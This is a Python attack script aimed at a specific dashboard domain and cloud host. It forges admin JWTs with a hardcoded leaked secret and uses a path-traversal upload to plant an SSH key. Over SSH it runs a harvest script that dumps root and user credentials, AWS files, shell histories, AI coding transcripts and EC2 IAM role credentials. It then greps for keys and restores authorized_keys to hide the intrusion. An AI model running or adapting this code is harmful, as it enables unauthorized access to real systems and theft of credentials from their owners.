#!/usr/bin/env python3
# i29308: host-level read-only harvest of intelora12 (54.179.173.218) as coder (NOPASSWD sudo+docker).
# Step1: re-inject ed25519 pubkey via dashboard files/upload path injection (local branch /.lumii-agent-keeper/)
# Step2: ssh coder@54.179.173.218, run read-only harvest (docker inspect / systemd /opt /root /home/coder ...)
# Step3: IMDSv2 recheck (role/user-data/instance-identity)
# Step4: grep secrets
# Step5: restore/neutralize authorized_keys
import os, sys, json, base64, hmac, hashlib, subprocess, random
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="   # dashboard .env.local secret
AGENT = "agent-0cf829f4"; AUID = "4b4f439e-74f7-11f1-ac43-525400595be1"; ACUST = "tianyue"; AIP = "54.179.173.218"
UF = "/home/lumii/.lumii-agent-keeper/../.ssh"   # local write branch map: container /home/lumii = host /home/coder
UPATH = "/home/lumii/.ssh/authorized_keys"

def _b64(s):
    if isinstance(s, bytes): s = s.decode("utf-8", "replace")
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, _b64(s)), flush=True)

def Rbig(k, s, n=11000):
    if not isinstance(s, str): s = json.dumps(s, ensure_ascii=False, default=str)
    if len(s) == 0: s = "(empty)"
    for i in range(0, len(s), n):
        print("R:%s_%02d:%s" % (k, i // n, _b64(s[i:i+n])), flush=True)

def sh(a, timeout=120, inp=None):
    try:
        r = subprocess.run(a, input=inp, capture_output=True, timeout=timeout)
        return r.returncode, r.stdout.decode("utf-8", "replace"), r.stderr.decode("utf-8", "replace")
    except Exception as e:
        return -1, "", repr(e)

def curl(args, timeout=40):
    return sh(["curl", "-s", "-k", "-m", str(timeout)] + args, timeout=timeout + 20)

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge(p):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    pl = b64u(json.dumps(p, separators=(",", ":")))
    return h + "." + pl + "." + b64u(hmac.new(JWT_SECRET.encode(), (h + "." + pl).encode(), hashlib.sha256).digest())

def tok_for(uid, cust): return forge({"userId": uid, "email": "probe@x", "customer": cust, "role": "admin"})

def call(path, cookie=None, timeout=30, maxlen=4000):
    a = ["--http2", "-A", UA, "-H", "Accept: application/json", "-w", "\n__CODE__%{http_code}"]
    if cookie: a += ["-H", "Cookie: session=" + cookie]
    a += ["https://%s%s" % (HOST, path)]
    rc, out, err = curl(a, timeout=timeout); i = out.rfind("__CODE__"); code = ""; txt = out
    if i >= 0: code = out[i+8:].strip()[:3]; txt = out[:i]
    return {"code": code, "body": txt[:maxlen]}

def files_read(path, tok, maxlen=4000):
    return call("/api/agents/%s/files?action=read&path=%s" % (AGENT, up.quote(path, safe="/")), cookie=tok, maxlen=maxlen)

def upload(tok, path, name, content, timeout=60):
    tmp = "/tmp/u_%d" % random.randint(1000, 999999)
    open(tmp, "wb").write(content.encode() if isinstance(content, str) else content)
    url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, AGENT, up.quote(path, safe="/"))
    rc, out, err = curl(["--http2", "-A", UA, "-H", "Authorization: Bearer " + tok, "-w", "\n__CODE__%{http_code}",
                         "-F", "files=@%s;filename=%s" % (tmp, name), url], timeout=timeout)
    try: os.unlink(tmp)
    except Exception: pass
    i = out.rfind("__CODE__"); code = ""; txt = out
    if i >= 0: code = out[i+8:].strip()[:3]; txt = out[:i]
    return {"code": code, "body": txt[:900]}

HARVEST = r'''
set +e
export LC_ALL=C
echo "=== ID/HOST ==="; id; hostname; uptime; uname -r
echo "=== SUDO ==="; sudo -n id
echo "=== DOCKER PS ==="; sudo -n docker ps -a --no-trunc 2>&1 | head -40
echo "=== DOCKER INSPECT ==="
for c in $(sudo -n docker ps -aq 2>/dev/null); do
  echo "### cid=$c"
  sudo -n docker inspect "$c" 2>/dev/null | timeout 20 python3 -c '
import sys,json
try:
 d=json.load(sys.stdin)
except Exception as e:
 print("parse err",e); sys.exit()
for x in d:
  c=x.get("Config",{}) or {}
  print("Name:",x.get("Name"))
  print("Image:",c.get("Image"))
  print("NetworkMode:",(x.get("HostConfig",{}) or {}).get("NetworkMode"))
  print("Env:")
  for e in (c.get("Env") or []): print("   ",e)
  print("Labels:",json.dumps(c.get("Labels") or {}))
  print("Binds:",json.dumps((x.get("HostConfig",{}) or {}).get("Binds")))
  print("Mounts:",json.dumps(x.get("Mounts")))
  print("Cmd:",json.dumps(c.get("Cmd")))
  print("Entrypoint:",json.dumps(c.get("Entrypoint")))
'
done
echo "=== HOST TOP DIRS ==="; sudo -n ls -la /opt /srv /data /root /home 2>&1 | head -80
echo "=== SYSTEMD UNITS ==="; sudo -n ls /etc/systemd/system/ 2>/dev/null | head -100
echo "=== LUMII/AGENT UNITS ==="
sudo -n sh -c 'for f in /etc/systemd/system/*lumii* /etc/systemd/system/*agent* /etc/systemd/system/*keeper* /etc/systemd/system/*sandbox* /etc/systemd/system/*coder*; do [ -f "$f" ] && { echo "## $f"; cat "$f"; echo; }; done' 2>/dev/null | head -250
echo "=== PROC LIST ==="
sudo -n ps auxww 2>/dev/null | grep -iE "agent-keeper|agent_keeper|lumii|sandbox|dockerd|coder" | grep -v grep | cut -c1-260 | head -40
echo "=== OPT TREE (maxdepth3) ==="; sudo -n find /opt /srv /data -maxdepth 3 2>/dev/null | head -120
echo "=== /root FILES ==="
sudo -n sh -c 'ls -la /root 2>/dev/null; echo "--hist--"; tail -80 /root/.bash_history 2>/dev/null; echo "--aws--"; cat /root/.aws/credentials /root/.aws/config 2>/dev/null; echo "--ssh--"; ls -la /root/.ssh 2>/dev/null; echo "--netrc--"; cat /root/.netrc 2>/dev/null'
echo "=== /home/coder LIST ==="
sudo -n sh -c 'ls -la /home/coder 2>/dev/null; echo; for d in .ssh .aws .config .local .netrc .gitconfig .git-credentials .codex-sessions .gstack .claude .lumii .npm; do echo "-- $d --"; ls -la /home/coder/$d 2>&1 | head -25; done'
echo "=== CODER DOTFILE CONTENTS ==="
sudo -n sh -c 'for f in /home/coder/.gitconfig /home/coder/.netrc /home/coder/.git-credentials /home/coder/.decart.env /home/coder/.config/git/config /home/coder/.aws/credentials /home/coder/.aws/config; do echo "### $f"; head -80 "$f" 2>/dev/null; done'
echo "=== CODER HISTORY ==="; sudo -n sh -c 'tail -120 /home/coder/.bash_history 2>/dev/null' | cut -c1-300
echo "=== /home/ubuntu ==="; sudo -n sh -c 'ls -la /home/ubuntu 2>/dev/null; ls -la /home/ubuntu/.ssh /home/ubuntu/.aws 2>/dev/null'
echo "=== CLAUDE TRANSCRIPT SIZES ==="; sudo -n find /home/coder/.claude /home/coder/.gstack /home/coder/.codex-sessions -type f 2>/dev/null -printf '%s %p\n' | sort -n | tail -40
echo "=== IMDSv2 ==="
TOK=$(curl -s -m5 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 300")
echo "token_len=${#TOK}"
echo "roles:"; curl -s -m5 -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/iam/security-credentials/; echo
for r in $(curl -s -m5 -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/iam/security-credentials/); do echo "role=$r"; curl -s -m5 -H "X-aws-ec2-metadata-token: $TOK" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$r"; echo; done
echo "=== INSTANCE IDENTITY ==="; curl -s -m5 -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/dynamic/instance-identity/document; echo
echo "=== USER DATA ==="; curl -s -m5 -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/user-data | head -60; echo
echo "=== GREP SECRETS host ==="
sudo -n sh -c "timeout 120 grep -rIEa 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,}|AKID[0-9A-Za-z]{12,}|JWT_SECRET|DATABASE_URL|postgres://|mysql://|redis://|-----BEGIN [A-Z ]*PRIVATE KEY|0x[0-9a-fA-F]{64}|zoofi|cloudflared|rathole|trycloudflare|AGENT_WS_TOKEN|proof_key|inbound_key|DECART' /home/coder/.claude /home/coder/.gstack /home/coder/.codex-sessions /home/coder/.config /home/coder/.gitconfig /home/coder/.netrc /home/coder/.decart.env /home/coder/.ssh /opt /etc/systemd /root 2>/dev/null" | cut -c1-320 | head -150
echo "=== END ==="
'''

def main():
    tok = tok_for(AUID, ACUST)
    R("me", call("/api/me", cookie=tok))
    # ensure key
    sh(["rm", "-f", "/tmp/k29308", "/tmp/k29308.pub"])
    rc, pub, err = sh(["ssh-keygen", "-t", "ed25519", "-N", "", "-C", "i29308", "-f", "/tmp/k29308"], timeout=30)
    pub = open("/tmp/k29308.pub").read().strip() if os.path.exists("/tmp/k29308.pub") else ""
    R("pub", pub)
    # read current authorized_keys
    cur = files_read(UPATH, tok, maxlen=6000)
    orig = ""
    try: orig = json.loads(cur["body"]).get("content", "") or ""
    except Exception: pass
    R("authkeys_before", {"code": cur["code"], "len": len(orig), "orig": orig[:500]})
    content = (orig.rstrip("\n") + "\n" if orig.strip() else "") + pub + "\n"
    R("upload_key", upload(tok, UF, "authorized_keys", content))
    R("authkeys_after", files_read(UPATH, tok, maxlen=900))
    # ssh harvest
    rc, out, err = sh(["ssh", "-i", "/tmp/k29308", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
                       "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=15", "coder@" + AIP, "bash -s"],
                      inp=HARVEST.encode(), timeout=420)
    R("harvest_rc", {"rc": rc})
    Rbig("harvest_out", out)
    R("harvest_err", err[:1500])
    # restore authorized_keys
    if orig.strip():
        R("restore", upload(tok, UF, "authorized_keys", orig))
    else:
        R("restore", upload(tok, UF, "authorized_keys", ""))
    R("authkeys_final", files_read(UPATH, tok, maxlen=600))

try:
    main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-2500:])
finally:
    sys.exit(1)
